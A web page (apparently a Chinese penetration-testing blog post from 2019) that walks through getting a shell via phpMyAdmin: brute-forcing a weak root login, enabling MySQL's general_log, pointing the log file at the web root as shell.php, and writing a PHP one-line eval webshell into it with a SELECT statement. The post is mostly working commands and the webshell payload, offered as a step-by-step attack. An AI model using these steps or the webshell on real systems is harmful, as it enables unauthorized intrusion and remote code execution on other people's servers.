@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>phpMyAdmin利用日志文件GetSHELL | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">phpMyAdmin利用日志文件GetSHELL</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 30, 2019&nbsp;&nbsp;23:01:11</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="hpMyAdmin简介"><a href="#hpMyAdmin简介" class="headerlink" title="hpMyAdmin简介"></a>hpMyAdmin简介</h2><p><code>phpMyAdmin</code> 是众多MySQL图形化管理工具中使用最为广泛的一种，是一款使用<code>PHP </code>开发的基于<code>B/S</code>模式的MySQL客户端软件，该工具是基于 Web 跨平台的管理程序，并且支持简体中文，用户可以在官网上下载最新版本的。</p>
+<h2 id="GetSHELL前提"><a href="#GetSHELL前提" class="headerlink" title="GetSHELL前提"></a>GetSHELL前提</h2><p>1、phpMyAdmin利用日志文件GetSHELL前提账号必须有可读可写权限</p>
+<p>2、MySQL版本大于5.0，MySQL 5.0版本以上会创建日志文件，我们通过修改日志文件的全局变量，就可以GetSHELL</p>
+<p>3、满足上方两个条件，还需要知道网站的绝对路径,对于网站的绝对路径查找有很多方法，在我博客里有讲解到：<a target="_blank" rel="noopener" href="http://www.liuwx.cn/penetrationtest-6.html">http://www.liuwx.cn/penetrationtest-6.html</a></p>
+<h2 id="GetSHELL过程"><a href="#GetSHELL过程" class="headerlink" title="GetSHELL过程"></a>GetSHELL过程</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/532.png" alt="图片"></p>
+<p>这边是通过<code>php探针</code>获取到了网站的<code>绝对路径</code>:<code>:/phpStudy/WWW</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/533.png" alt="图片"></p>
+<p>接着是通过弱口令爆破来得到了<code>phpMyAdmin</code>的登陆账号密码:<code>root</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/534.png" alt="图片"></p>
+<p>进入到<code>phpMyAdmin</code>管理页面后，得到一些关键信息：</p>
+<ul>
+<li>数据库服务器</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">服务器: localhost via TCP/IP</span><br><span class="line">软件: MySQL</span><br><span class="line">软件版本: 5.5.40 - MySQL Community Server (GPL)</span><br><span class="line">协议版本: 10</span><br><span class="line">用户: root@localhost</span><br><span class="line">服务器字符集: UTF-8 Unicode (utf8)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>网站服务器</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Apache/2.4.10 (Win32) OpenSSL/0.9.8zb PHP/5.2.17</span><br><span class="line">数据库客户端版本: libmysql - 5.0.51a</span><br><span class="line">PHP 扩展: mysqli 文档</span><br></pre></td></tr></table></figure>
+
+<p>得知<code>MySQL</code>的版本是大于<code>5.0</code>，那么应该可以通过日志写入shell</p>
+<h2 id="查看日志的信息"><a href="#查看日志的信息" class="headerlink" title="查看日志的信息"></a>查看日志的信息</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/535.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables  like  &#x27;%general%&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>日志读写默认是关闭的<code>OFF</code>,然后我们打开日志读写功能：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/536.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">打开general_log日志读写功能</span><br><span class="line">SET GLOBAL general_log=&#x27;on&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/537.png" alt="图片"><br><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/538.png" alt="图片"></p>
+<h2 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h2><p>由于之前我们通过php探针得到了网站的绝对路径，然后我们就可以写入<code>shell.php</code>到网站的根目录下：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/539.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL general_log_file=&#x27;C:/phpStudy/WWW/shell.php&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这个时候，对应的路径下就会生成一个<code>shell.php</code>脚本文件：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/540.png" alt="图片"></p>
+<h2 id="写入一句话到shell-php"><a href="#写入一句话到shell-php" class="headerlink" title="写入一句话到shell.php"></a>写入一句话到shell.php</h2><p>PHP一句话木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;liuwx&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>写入一句话语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php @eval($_POST[&#x27;liuwx&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/541.png" alt="图片"></p>
+<p>这个时候就成功写入一句话到了<code>shell.php</code>里：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/542.png" alt="图片"></p>
+<p>成功<code>GetSHELL</code>:</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/543.png" alt="图片"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2019/10/30/phpMyAdmin-1/">http://example.com/2019/10/30/phpMyAdmin-1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/phpMyAdmin/"># phpMyAdmin</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/10/31/RedTeaming-4/">Windows提权之主机信息搜集</a>
+            
+            
+            <a class="next" rel="next" href="/2019/10/30/RedTeaming-3/">Windows提权之快速查找Exploit</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
